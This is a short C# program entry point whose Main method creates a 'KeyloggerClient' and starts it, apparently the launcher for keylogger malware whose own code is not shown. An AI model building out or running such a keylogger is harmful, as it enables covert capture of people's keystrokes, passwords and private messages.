using KeyloggerClient;

class Program
{
    static async Task Main()
    {
        var client = new KeyloggerClient.KeyloggerClient();
        await client.StartAsync(); 
    }
}
